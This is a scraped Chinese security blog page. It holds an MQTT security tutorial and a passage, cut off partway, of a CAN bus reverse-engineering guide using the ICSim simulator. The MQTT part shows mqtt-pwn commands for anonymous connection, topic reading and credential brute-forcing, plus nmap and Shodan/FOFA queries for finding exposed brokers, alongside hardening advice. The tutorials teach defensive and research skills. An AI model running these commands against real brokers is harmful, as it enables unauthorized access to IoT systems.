&lt;p&gt;消息的发送方被称为发布者，消息的接收方被称为订阅者，发送者和订阅者发布或订阅消息均会连接BROKER，BROKER一般为服务端，BROKER存放消息的容器就是主题。发布者将消息发送到主题中，订阅者在接收消息之前需要先“订阅主题”。每份订阅中，订阅者都可以接收到主题的所有消息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01b3844d8b306b3f7c.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;其MQTT协议流程图如下： &lt;img src=&#34;https://p1.ssl.qhimg.com/t01c8644cc806e6316e.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里不对协议进行过多介绍，感兴趣的大家可以结尾处的引用查看。&lt;/p&gt;
&lt;h2 id=&#34;mqtt的攻击点&#34;&gt;MQTT的攻击点&lt;/h2&gt;
&lt;p&gt;根据其特性，可以扩展如下几个攻击点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;授权：匿名连接问题，匿名访问则代表任何人都可以发布或订阅消息。如果存在敏感数据或指令，将导致信息泄漏或者被恶意攻击者发起恶意指令；&lt;/li&gt;
&lt;li&gt;传输：默认未加密，则可被中间人攻击。可获取其验证的用户名和密码；&lt;/li&gt;
&lt;li&gt;认证：弱口令问题，由于可被爆破，设置了弱口令，同样也会存在安全风险；&lt;/li&gt;
&lt;li&gt;应用：订阅端明文配置导致泄漏其验证的用户名和密码；&lt;/li&gt;
&lt;li&gt;漏洞：服务端软件自身存在缺陷可被利用，或者订阅端或服务端解析内容不当产生安全漏洞，这将导致整个系统。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;mqtt的利用&#34;&gt;MQTT的利用&lt;/h3&gt;
&lt;p&gt;目前已经有针对MQTT的开源利用工具，这里主要以mqtt-pwn这块工具为主。mqtt-pwn这块工具功能强大易用。github地址为&lt;a href=&#34;https://github.com/akamai-threat-research/mqtt-pwn&#34;&gt;https://github.com/akamai-threat-research/mqtt-pwn&lt;/a&gt;，使用文档地址为&lt;a href=&#34;https://mqtt-pwn.readthedocs.io/en/latest/&#34;&gt;https://mqtt-pwn.readthedocs.io/en/latest/&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;工具安装&lt;/strong&gt;&lt;br&gt;
mqtt-pwn的安装很简单。可以直接安装到本机，也可以直接使用docker的方式。&lt;br&gt;
文本直接使用docker方式。首先确保已经安装docker和docker-compose。然后运行如下命令进行安装:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/akamai-threat-research/mqtt-pwn.git
cd mqtt-pwn
docker-compose up --build --detach
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker-compose ps
docker-compose run cli
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即可看到mqtt-pwn的界面。&lt;br&gt;
&lt;img src=&#34;https://p2.ssl.qhimg.com/t0145aba7cf70a0a690.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MQTT匿名访问&lt;/strong&gt;&lt;br&gt;
有一些MQTT的服务端软件默认是开启匿名访问，如果管理员没有网络安全意识或懒惰，只要对公网开放，任何人都可以直接访问。&lt;/p&gt;
&lt;p&gt;使用mqtt-pwn的connect命令进行连接。&lt;code&gt;connect -h&lt;/code&gt; 显示帮助信息，其他命令也是如此，使用时，多看帮助和文档，很快就可以熟悉使用。&lt;br&gt;
对于开启匿名的服务，直接&lt;code&gt;connect -o host&lt;/code&gt; 即可，当然该命令也支持输入用户名和密码。如果没有显示连接异常，就表示连接成功。连接成功后，可使用&lt;code&gt;system_info&lt;/code&gt; 查看系统信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01287faaad96ebfc43.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;接下来就可以查看topic信息等内容。这时先执行&lt;code&gt;discovery&lt;/code&gt;，等待显示scan  #1 has finished，接下来执行&lt;code&gt;scans -i 序号&lt;/code&gt;，在执行&lt;code&gt;topics&lt;/code&gt;命令即可看到topic信息。 其中&lt;code&gt;disconvery&lt;/code&gt;可以使用&lt;code&gt;-t&lt;/code&gt;参数设置超时时间。&lt;code&gt;topics&lt;/code&gt;命令可以使用&lt;code&gt;-l&lt;/code&gt;参数设置查看条数。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t0178206285c0ae4785.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;可以输入&lt;code&gt;messages&lt;/code&gt;查看topic的内容。使用&lt;code&gt;-l&lt;/code&gt;限制条数，&lt;code&gt;-i&lt;/code&gt;参数查看某个单挑消息内容等。&lt;br&gt;
&lt;img src=&#34;https://p3.ssl.qhimg.com/t0160bb2c89e37fa7c6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t016e010021b6700142.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;MQTT用户名密码爆破&lt;/strong&gt;&lt;br&gt;
metasploit带有MQTT的爆破模块，经过实际测试，效果并不理想。这里仍然以mqtt-pwn来进行介绍。&lt;br&gt;
mqtt-pwn具有bruteforce功能，并带了一个简单的字典，可以爆破MQTT的用户名和密码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bruteforce --host host --port -uf user_dic -pf pass_dic 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;端口默认是1883，用户和密码字典默认会在mqtt-pwn的&lt;code&gt;resources/wordlists&lt;/code&gt; 文件夹下。&lt;/p&gt;
&lt;p&gt;例如执行&lt;code&gt;bruteforce --host 127.0.0.1&lt;/code&gt;爆破。爆破成功后就可以使用上面将到的内容进行连接进行操作，在连接时加上用户名和密码选项即可。&lt;/p&gt;
&lt;p&gt;mqtt-pwn还支持更多功能，如&lt;a href=&#34;https://mqtt-pwn.readthedocs.io/en/latest/plugins/owntracks.html&#34;&gt;Owntracks (GPS Tracker)&lt;/a&gt;、&lt;a href=&#34;https://mqtt-pwn.readthedocs.io/en/latest/plugins/sonoff.html&#34;&gt;Sonoff Exploiter&lt;/a&gt;等。感兴趣的大家自己去看下文档去进行测试。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;应用中发现&lt;/strong&gt;&lt;br&gt;
在实际的使用场景我们可以通过中间人劫持从流量中捕获验证信息。以下为wireshark抓包内容。&lt;br&gt;
&lt;img src=&#34;https://p5.ssl.qhimg.com/t014090f26a582af519.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;除此之外，由于目前多种语言实现了mqtt的客户端，web应用中还有webscoket的mqtt。这使得可以通过web的网页源码或网络请求获得验证的信息。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t01c3af2e34139f7a84.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;服务端漏洞&lt;/strong&gt;&lt;br&gt;
这里列举一些历史上MQTT的漏洞供参考。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cvedetails.com/cve/CVE-2017-7296/&#34;&gt;CVE-2017-7296&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mosquitto.org/blog/2017/05/security-advisory-cve-2017-7650/&#34;&gt;CVE-2017-7650&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-17614&#34;&gt;CVE-2018-17614&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/541354&#34;&gt;CVE-2019-5432&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2020-13849&#34;&gt;CVE-2020-13849&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mosquitto.org/security/&#34;&gt;Mosquitto漏洞列表&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;探测与发现&#34;&gt;探测与发现&lt;/h2&gt;
&lt;p&gt;功能强大的nmap是支持MQTT协议的识别的，可以直接通过nmap进行识别MQTT协议。另外，除上面提到的默认端口外，有的管理员会修改默认端口，这时也可以尝试1884，8084，8884等临近端口以进行快速探测，或前面增加数字等作为组合，如果针对单个目标，则可以探测全部端口。如果进行大规模的扫描或者提升扫描效率，则可以使用masscan、zmap、RustScan等先进性端口扫描，在使用nmap进行协议识别即可。&lt;br&gt;
nmap举例命令如下：&lt;br&gt;
&lt;code&gt;sudo nmap -p1883,8083,8883 -sS -sV --version-intensity 9 -Pn --open target_ip&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://p3.ssl.qhimg.com/t018117aa19a2c9274f.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;nmap也有相关的MQTT lua脚本可以使用，其MQTT版本为3.1.1。脚本地址为&lt;a href=&#34;https://svn.nmap.org/nmap/nselib/mqtt.lua&#34;&gt;https://svn.nmap.org/nmap/nselib/mqtt.lua&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果想要自己编写代码去进行探测，只需要根据MQTT的协议标准，通过socket即可进行收发报文。关于MQTT协议的详细内容可以查看文档，地址为&lt;a href=&#34;https://docs.oasis-open.org/mqtt/mqtt/&#34;&gt;https://docs.oasis-open.org/mqtt/mqtt/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现有的网络空间测绘平台基本都实现了对MQTT进行探测。可直接通过这些搜索引擎获取大量对外使用MQTT协议的服务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;知风&lt;br&gt;
在针对IoT和ICS探测的搜索引擎知风中搜索，直接搜索&lt;code&gt;mqtt&lt;/code&gt;关键字，可以发现15万个对外开放的服务。&lt;br&gt;
&lt;img src=&#34;https://p1.ssl.qhimg.com/t01e5819f5a7da4e34c.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fofa&lt;br&gt;
搜索关键字为&lt;code&gt;protocol=mqtt&lt;/code&gt;，一年内有25万个对外开放。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://p2.ssl.qhimg.com/t0137efdf7d38a450f0.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;shodan&lt;br&gt;
搜索关键字：&lt;br&gt;
product:&amp;quot;MQTT&amp;quot;&lt;br&gt;
product:&amp;quot;Mosquitto&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;shodan上搜索后共有超过11万个对外开放。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t0146755084862cf215.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;通过以上的搜索结果，各引擎各有优劣。shodan和知风针对该协议的探测均会列出topic；而fofa从发现数量上最多，但是仅识别了协议，并未列出topic；除此之外知风系统的地理位置定位精度较高，可以定位百米范围内。&lt;/p&gt;
&lt;h2 id=&#34;mqtt-安全建议&#34;&gt;mqtt 安全建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;请勿启用匿名访问，对服务端（BROKER）设置认证，增加用户名密码验证。&lt;/li&gt;
&lt;li&gt;根据实际情况，优先使用加密传输数据，防止中间人攻击。&lt;/li&gt;
&lt;li&gt;加密payload后在进行安全传输。&lt;/li&gt;
&lt;li&gt;使用最新的服务端程序架设服务。&lt;/li&gt;
&lt;li&gt;不要将实现的代码上传到github等代码公开平台。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结&lt;/h2&gt;
&lt;p&gt;写这篇文章时，网络上关于MQTT安全的文章并不多，但是通过对其了解，仍然有不少内容可以探索，比如在工业上有MQTT网关，以及众多支持MQTT的服务端软件、加上广泛的应用场景。本文简单介绍MQTT安全的内容，还有更多的内容等待探索。感兴趣的朋友也欢迎大家多多交流讨论。&lt;/p&gt;
&lt;p&gt;最后，提醒一下大家，在学习和研究过程中自己搭建服务进行学习。请勿对网络上的目标进行测试、破坏等活动。&lt;/p&gt;
&lt;h2 id=&#34;引用&#34;&gt;引用&lt;/h2&gt;
&lt;p&gt;https://dzone.com/articles/exploiting-mqtt-using-lua&lt;br&gt;
https://www.hindawi.com/journals/wcmc/2018/8261746/&lt;br&gt;
https://github.com/akamai-threat-research/mqtt-pwn&lt;br&gt;
https://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b&lt;br&gt;
https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto&lt;br&gt;
https://hackmd.io/@QwmL8PAwTx-bYDnry-ONpA/H1nm2tHzb?type=view&lt;br&gt;
https://ttm4175.iik.ntnu.no/prep-iot-mqtt.html&lt;br&gt;
https://mobilebit.wordpress.com/tag/mqtt/&lt;br&gt;
https://www.hivemq.com/blog/seven-best-mqtt-client-tools/&lt;br&gt;
https://nmap.org/nsedoc/lib/mqtt.html&lt;br&gt;
http://mqtt.p2hp.com/&lt;/p&gt;
">物联网安全之MQTT协议安全</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hacking-all-the-cars-can-bus-reverse/"" data-c="
          &lt;p&gt;本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。&lt;/p&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;p&gt;CAN(Controller Area Network)总线是制造业和汽车产业中使用的一种简单协议，为ISO国际标准化的串行通信协议。在现代汽车中的小型嵌入式系统和ECU能够使用CAN协议进行通信，其通信是采用的广播机制，与TCP协议中的UDP差不多。各个系统或ECU（电子控制单元）都可以收发控制消息。1996年起该协议成了美国轿车和轻型卡车的标准协议之一，但是直到2008年才成为强制标准（2001年成为欧洲汽车标准）。当然1996年之前的也有可能使用CAN总线。现在，汽车的电子组件均通过CAN总线连接，针对汽车的攻击最终也都会通过CAN总线来实现。对于研究汽车安全，CAN总线协议是必须要掌握的。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;环境与准备&#34;&gt;环境与准备&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CAN总线模拟--ICSim&lt;/li&gt;
&lt;li&gt;分析工具-- can-utils、Kayak、Wireshark&lt;/li&gt;
&lt;li&gt;系统--Kali Linux 2020 语言为中文（非root权限）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;icsim编译&#34;&gt;ICSim编译&lt;/h3&gt;
&lt;p&gt;ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。&lt;/p&gt;
&lt;p&gt;GITHUB地址：&lt;a href=&#34;https://github.com/zombieCraig/ICSim&#34;&gt;https://github.com/zombieCraig/ICSim&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ICSim目前仅可运行在linux系统下，在Kali linux上按照github提供的安装方法，会出现“libsdl2-dev 未满足的依赖关系”的错误，错误如下图。&lt;br&gt;
&lt;img src=&#34;https://p1.ssl.qhimg.com/t0108e075fc23454fc4.png&#34; alt=&#34;ICSim安装出错&#34; title=&#34;ICSim安装出错&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以通过aptitude安装来解决，具体安装步骤如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update 
sudo apt-get install aptitude
sudo aptitude install libibus-1.0-dev
sudo apt-get install gcc
git clone https://github.com/zombieCraig/ICSim
cd ICSim
make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至此ICSim安装完成，目录内容如下：&lt;br&gt;
&lt;img src=&#34;https://p3.ssl.qhimg.com/t012c81b11ee13908a0.png&#34; alt=&#34;ICsim安装完成&#34; title=&#34;ICsim安装完成&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;切换到ICSim目录，执行如下命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./setup_vcan.sh         #初始化，每次重启后都要重新运行
./icsim vcan0           #模拟器
./controls vcan0        #控制面
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行后可以看到如下界面，像游戏手柄的界面是控制面板（这里可以插入USB游戏手柄进行控制，笔者这里没有，有USB手柄的大家可自行测试）。另外有仪表盘的窗口是模拟器，速度表停在略高于0mph的位置，如果指针有摆动就说明ICSim工作正常。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01ffdc6dd4e1d1e56f.png&#34; alt=&#34;ICSim启动&#34; title=&#34;ICSim启动&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;其控制器的按键说明如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;功能&lt;/th&gt;
&lt;th&gt;按键&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;加速&lt;/td&gt;
&lt;td&gt;上方向键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;左转向&lt;/td&gt;
&lt;td&gt;左方向键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;右转向&lt;/td&gt;
&lt;td&gt;右方向键&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关左车门（前）锁&lt;/td&gt;
&lt;td&gt;右/左shift+A&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关右车门（前）锁&lt;/td&gt;
&lt;td&gt;右/左shift+B&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关左车门（后）锁&lt;/td&gt;
&lt;td&gt;右/左shift+X&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开/关右车门（后）锁&lt;/td&gt;
&lt;td&gt;右/左shift+Y&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开启所有车门锁&lt;/td&gt;
&lt;td&gt;右shift+左shift&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;关闭所有车门锁&lt;/td&gt;
&lt;td&gt;左shift+右shift&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;上面的&lt;code&gt;setup_vcan.sh&lt;/code&gt; 主要功能是加载CAN和vCAN（virtual controller area network）网络模块。并创建名为vcan0的网络设备并打开连接。&lt;br&gt;
&lt;code&gt;setup_vcan.sh&lt;/code&gt;文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo modprobe can
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行后，我们可以使用ifconfig来查看网络接口，发现会多出来一个vcan0的网络接口。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://p5.ssl.qhimg.com/t01cd5ca29d841c211e.png&#34; alt=&#34;vcan网络接口&#34; title=&#34;vcan网络接口&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;can-utils安装&#34;&gt;can-utils安装&lt;/h3&gt;
&lt;p&gt;can-utils是CAN实用的工具套件，包含了许多实用程序。&lt;/p&gt;
&lt;p&gt;GITHUB地址：&lt;a href=&#34;https://github.com/linux-can/can-utils&#34;&gt;https://github.com/linux-can/can-utils&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;经常用到的几个程序如下，更多命令可以看github地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;candump : 显示、过滤和记录CAN数据到文件。candump并不会解码数据。&lt;/li&gt;
&lt;li&gt;canplayer : 对记录的CAN数据进行重放。&lt;/li&gt;
&lt;li&gt;cansend : 发送CAN数据。&lt;/li&gt;
&lt;li&gt;cansniffer : 显示CAN数据并高亮显示变化的字节。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当前环境使用的Kali Linux 2020直接使用如下命令安装即可。如果你的系统不支持，则可以直接下载github上的源码，使用make命令进行编译安装。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install can-utils
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;kayak&#34;&gt;Kayak&lt;/h3&gt;
&lt;p&gt;Kayak可以直接通过github下载release版本的。但是，该工具的使用需要配合socketcand。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;socketcand安装&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;sudo apt install automake
git clone https://github.com/linux-can/socketcand.git
cd socketcand
./autogen.sh
./configure
make
sudo make install
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Kayak下载&lt;br&gt;
GITHUB下载：&lt;a href=&#34;https://github.com/dschanoeh/Kayak/releases&#34;&gt;https://github.com/dschanoeh/Kayak/releases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;解压缩后，bin文件夹下有windows版本和linux的运行程序。Kali下直接在terminal下运行./kayak 即可。当然这里也可以下载源代码，并使用maven编译。&lt;/p&gt;
&lt;h2 id=&#34;前置知识&#34;&gt;前置知识&lt;/h2&gt;
&lt;p&gt;上面已经准备好了环境，在真正开始分析之前，先简单说一些前置知识。&lt;/p&gt;
&lt;h3 id=&#34;can总线&#34;&gt;CAN总线&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;CAN运行在两条线路上：CAN高电平（CANHI）和CAN低电平（CANLO）。&lt;/li&gt;
&lt;li&gt;CAN bus 有四种帧类型&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;帧类型&lt;/th&gt;
&lt;th&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;数据帧（Data Frame）&lt;/td&gt;
&lt;td&gt;包含要传输的节点数据的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;远程帧（Remote Frame）&lt;/td&gt;
&lt;td&gt;请求传输特定标识符的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;错误帧（Remote Frame）&lt;/td&gt;
&lt;td&gt;任何检测到错误的节点发送的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;重载帧（Overload Frame）&lt;/td&gt;
&lt;td&gt;在数据或远程帧之间插入延迟的帧&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;CAN有两种类型的消息(帧)格式：标准（基础）帧格式和扩展帧格式。标准（基础）帧有11位标识符，扩展帧格式有29位标识符。CAN标准帧格式和CAN扩展帧格式之间的区别是通过使用IDE位进行的，IDE位在11位帧的情况下以显性方式传输，而在29位帧的情况下以隐性方式进行传输。支持扩展帧格式消息的CAN控制器也能够以CAN基本帧格式发送和接收消息。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;标准帧格式&lt;br&gt;
说一下主要的4个元素，其他的大家感兴趣可自行去了解：
&lt;ul&gt;
&lt;li&gt;仲裁ID（Arbitration ID）：仲裁ID是一种广播消息，用来识别正视图通信的设备的ID，其实也代表发送消息的地址。任何的设备都可以发送多个仲裁ID。在总线中同时发送的消息，低仲裁ID的消息拥有优先权。&lt;/li&gt;
&lt;li&gt;标识符扩展（IDE）：标准帧格式该位始终是0。&lt;/li&gt;
&lt;li&gt;数据长度码（DLC）：表示数据的大小，番位是0字节到8字节。&lt;/li&gt;
&lt;li&gt;数据（Data）：总线传输数据本身。一个标准的数据帧可携带最大尺寸为8字节。有些系统中会强制要求8字节，不满8字节则填充为8字节。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://p1.ssl.qhimg.com/t012f6fcd1baa40a15f.png&#34; alt=&#34;CAN总线协议&#34; title=&#34;CAN总线协议&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;扩展帧格式&lt;br&gt;
扩展帧格式与标准帧格式类似，扩展帧格式可以连接在一起，形成更长的ID。拓展帧格式可包含标准帧格式。拓展帧格式的标识符扩展IDE被设置为1。扩展帧有一个18位的标识符，是标准的11位标识符的第二部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;can总线威胁&#34;&gt;CAN总线威胁&lt;/h3&gt;
&lt;p&gt;根据CAN总线的特性，我们则可以了解CAN面临的威胁：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CAN总线通信是广播的方式，所以数据是可以被监听和获取的。&lt;/li&gt;
&lt;li&gt;CAN总线协议中ID代表报文优先级，协议中没有原始地址信息。也就是说任何人都可以伪造和发送虚假或恶意的报文。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另外拒绝服务攻击在CAN总线协议中也是存在的。但是我们主要是分析和逆向CAN总线。这里不做相关说明。&lt;/p&gt;
&lt;h3 id=&#34;监听can流量&#34;&gt;监听CAN流量&lt;/h3&gt;
&lt;p&gt;监听CAN流量有多种方法。首先请保证启动ICSim。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;can-utils 工具包监听&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;candump -l vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入该命令后会监听流量并以candump-YYYY-MM-DD_time.log格式的文件名保存到当前目录下。如candump-2020-06-22_103240.log。按ctrl+c停止监听。&lt;br&gt;
打开文件，数据格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(1592836523.941032) vcan0 164#0000C01AA8000022
(1592836523.941168) vcan0 17C#0000000010000003
(1592836523.941285) vcan0 18E#00004D
(1592836523.941387) vcan0 1CF#80050000000F
(1592836523.941745) vcan0 1DC#0200000C
(1592836523.943317) vcan0 183#0000000E0000100D
(1592836523.943545) vcan0 143#6B6B00C2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;括号内的是时间戳，vcan0为我们的虚拟can接口。后面的是ID和数据，ID和数据以#号分割。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01b672639867e53755.png&#34; alt=&#34;candump&#34; title=&#34;candump&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;也可以去掉-l选项，直接在屏幕上可以打印数据包。&lt;/p&gt;
&lt;p&gt;candump是监听并记录原始数据，会有很多对我们无用的数据。can-utils工具包中还有一款可以根据仲裁ID进行分组显示，并对变化的数据以红色显示，它就是cansniffer。&lt;br&gt;
命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cansniffer -c vcan0
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01ae91fe1caf0be3b1.png&#34; alt=&#34;cansniffer&#34; title=&#34;cansniffer&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;cansniffer可以通过发送按键来过滤显示数据包。注意，当输入按键时，并不会在终端中显示，输入完成后按回车键（一定要记得按）。如下例子则是先关闭所有数据包显示（-000000），然后仅显示ID133和ID244的数据包。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-000000
+133
+244
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;Wireshark 监听&lt;br&gt;
wireshark功能简直太强大了，它也可以捕获CAN数据报文。打开wireshark，选择vcan0接口即可监听流量。info列中可以看到ID和数据。wireshark也是原始流量，并为进行去重。&lt;br&gt;
&lt;img src=&#34;https://p5.ssl.qhimg.com/t01f244f261e0e195c2.png&#34; alt=&#34;wireshark捕获can协议数据&#34; title=&#34;wireshark捕获can协议数据&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
